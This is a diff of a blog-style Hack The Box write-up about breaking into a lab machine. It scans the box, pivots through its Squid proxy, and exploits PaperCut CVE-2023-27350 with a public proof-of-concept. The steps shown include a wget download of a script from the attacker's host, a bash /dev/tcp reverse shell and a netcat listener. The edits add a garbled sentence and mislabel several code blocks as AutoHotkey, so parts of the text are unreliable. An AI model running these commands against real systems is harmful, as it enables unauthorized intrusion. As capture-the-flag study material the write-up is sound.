@@ -7,7 +7,7 @@ TocOpen: true
 tags:
   - blog
   - HTB
-lastmod: 2026-03-22T16:35:41.391Z
+lastmod: 2026-03-22T19:55:21.343Z
 ---
 # Box Info
 
@@ -15,32 +15,10 @@ lastmod: 2026-03-22T16:35:41.391Z
 
 ***
 
-```console
-tester@linux:~/Desktop$ whoami 
-```
+Finally use the  `AutoHotkey` that will detect the tedsadsa@linux:~/ like that
 
-```bash
-tester@linux:~$
 ```
-
-```shell
-tester@linux:~$
-```
-
-```console
-tester@linux:~$
-```
-
-```console
-tester@linux:/$ proxychains -q python3 CVE-2023-27350.py.1 -u
-```
-
-```console
-~ proxychains -q python3 CVE-2023-27350.py.1 -u 
-```
-
-```console
-> ~/Desktop$ whoami
+tedsadsa@linux:~/Desktop$ whoami 
 ```
 
 # Recon 10.129.234.X
@@ -49,7 +27,7 @@ tester@linux:/$ proxychains -q python3 CVE-2023-27350.py.1 -u
 
 The `nmap` reveal that the machine has the port of 22 and 3128 for squid-http , remember to use the `--min-rate` , otherwise , the `nmap` scan can scan for 1 day
 
-```console
+```
 test $ sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.238.16 --min-rate 500
 Nmap scan report for 10.129.238.16
 Host is up, received echo-reply ttl 63 (0.66s latency).
@@ -95,7 +73,7 @@ The (VerylazyTech)\[https://www.verylazytech.com/squid-port-3128] say that **Por
 
 Base on HackTrick\[https://hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html] to pentest it
 
-```console
+```
 tester@linux$ git clone https://github.com/aancw/spose.git
 Cloning into 'spose'...
 remote: Enumerating objects: 34, done.
@@ -119,7 +97,7 @@ localhost:9195 seems OPEN
 
 **Proxychains for HTTP interaction:** append a strict HTTP entry at the bottom of `/etc/proxychains.conf`:
 
-```
+```shell
 [ProxyList]
 http    10.129.238.16   3128
 ```
@@ -128,7 +106,7 @@ http    10.129.238.16   3128
 
 Then interact with internal listeners (e.g., a web UI bound to 127.0.0.1) transparently through Squid:
 
-```console
+```AutoHotkey
 $ proxychains curl http://127.0.0.1:9191 -v
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
@@ -165,7 +143,7 @@ https://github.com/horizon3ai/CVE-2023-27350\
 POC\
 ![Pasted image 20260321133135.png](/ob/Pasted%20image%2020260321133135.png)
 
-```console
+```AutoHotkey
 tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:9191/ -c 'curl http://10.10.16.4'
 [*] Papercut instance is vulnerable! Obtained valid JSESSIONID
 [*] Updating print-and-device.script.enabled to Y
@@ -176,26 +154,26 @@ tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:91
 [*] Updating print.script.sandboxed to Y
 ```
 
-```
+```AutoHotkey
 tester@linux$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.238.16 - - [21/Mar/2026 13:29:25] "GET / HTTP/1.1" 200 -
 ```
 
-```
+```shell
 python3 -m http.server 80
 ```
 
 Create the shell
 
-```
+```shell
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.16.4/80 0>&1
 ```
 
 download the shell
 
-```
+```shell
 tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:9191/ -c 'wget http://10.10.16.4:80/shell.sh -O /tmp/shell.sh'
 [*] Papercut instance is vulnerable! Obtained valid JSESSIONID
 [*] Updating print-and-device.script.enabled to Y
@@ -212,7 +190,7 @@ start the revshell
 sudo nc -lvnp 80 
 ```
 
-```
+```shell
 tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:9191/ -c 'bash /tmp/shell.sh'
 [*] Papercut instance is vulnerable! Obtained valid JSESSIONID
 [*] Updating print-and-device.script.enabled to Y
@@ -223,7 +201,7 @@ tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:91
 [*] Updating print.script.sandboxed to Y
 ```
 
-```
+```shell
 tester@linux$ ssh-keygen -t ed25519 -C "haydon@kali-$(date +%Y%m%d)"
 Generating public/private ed25519 key pair.
 Enter file in which to save the key (/home/parallels/.ssh/id_ed25519): 
@@ -249,7 +227,7 @@ The key's randomart image is:
 +----[SHA256]-----+
 ```
 
-```
+```shell
 tester@linux$ ls ~/.ssh                                                           
 id_ed25519  id_ed25519.pub
                                                                                                                                                                              
@@ -317,7 +295,7 @@ python3 -m http.server 80
 
 ```
 
-```shell
+```AutoHotkey
 
 Last login: Sat Mar 21 06:13:12 2026 from 10.10.16.4
 papercut@bamboo:~$ 
